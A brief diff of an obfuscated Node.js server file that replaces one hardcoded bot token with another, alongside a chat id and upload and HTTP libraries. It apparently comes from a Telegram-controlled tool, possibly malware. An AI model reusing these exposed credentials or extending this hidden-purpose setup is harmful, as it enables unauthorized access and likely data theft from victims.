@@ -10,7 +10,7 @@ const uuid4 = require(_0x52ef[4]);
 const multer = require(_0x52ef[5]);
 const bodyParser = require(_0x52ef[6]);
 const axios = require(_0x52ef[7]); 
- '7839930753:AAGq9Fwweg8wNWcCpduOzDZHOr0QDZs6iI0' 
+ '8016555931:AAHhGXMJwmObT0CK9k5FRhNCCPnfMhes_1Y' 
 const id = '6969597735' 
 const address = 'https://www.google.com' 
 
